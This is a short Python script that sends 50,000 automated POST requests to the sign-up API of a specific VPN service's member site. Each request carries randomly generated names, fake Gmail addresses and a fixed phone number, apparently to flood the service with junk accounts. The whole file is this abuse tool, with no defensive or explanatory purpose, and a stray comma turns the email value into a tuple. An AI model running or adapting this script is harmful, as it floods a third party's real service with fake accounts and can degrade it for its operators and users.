import requests

import random
import string


def rand_string(length):
    letters = string.ascii_letters
    return "".join(random.choice(letters) for _ in range(length))


url_post = "https://member.vpn-remote.com/api/api-daftar.php"

for x in range(50000):
    email = "i.love.you1" + rand_string(5) + "@gmail.com",
    p = requests.post(
        url=url_post,
        data={
            "nama": "I Love YOU " + rand_string(3),
            "user": "I Love YOU " + rand_string(10),
            "email": email,
            "whatsapp": '854678546378',
            "password": email,
            "konfirmasi": email,
            "persetujuan": "on",
        },
    )
    print(p.text)
